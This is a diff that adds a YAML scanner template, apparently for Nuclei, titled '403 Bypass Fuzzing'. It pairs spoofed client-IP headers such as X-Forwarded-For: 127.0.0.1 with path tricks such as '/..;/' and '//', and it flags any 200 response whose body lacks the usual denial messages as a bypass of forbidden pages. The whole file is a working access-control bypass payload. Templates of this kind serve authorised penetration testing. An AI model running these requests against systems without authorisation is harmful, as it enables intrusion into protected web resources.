@@ -1,0 +1,57 @@
+id: 403-bypass-fuzz
+
+info:
+  name: 403 Bypass Fuzzing
+  author: e_schultze_
+  severity: high
+  description: Only use this template combined with 403-detect and 403-workflow
+
+requests:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        {{header}}: 127.0.0.1
+
+    attack: pitchfork
+    payloads:
+      header:
+        - "X-Client-IP"
+        - "X-Remote-IP"
+        - "X-Remote-Addr"
+        - "X-Forwarded-For"
+        - "X-Originating-IP"
+        - "X-Custom-IP-Authorization"
+        - "X-Host"
+        - "X-Forwarded-Host"
+
+      path:
+        - "/."
+        - "/./"
+        - "//"
+        - "/?"
+        - "/???"
+        - "/..;/"
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "AccessDenied"
+          - "Forbidden"
+          - "Missing Authentication Token"
+          - "Redirect Error"
+          - "Redirect Problem"
+          - "The page you have requested is unavailable"
+          - "You do not have permission to view this directory"
+        negative: true
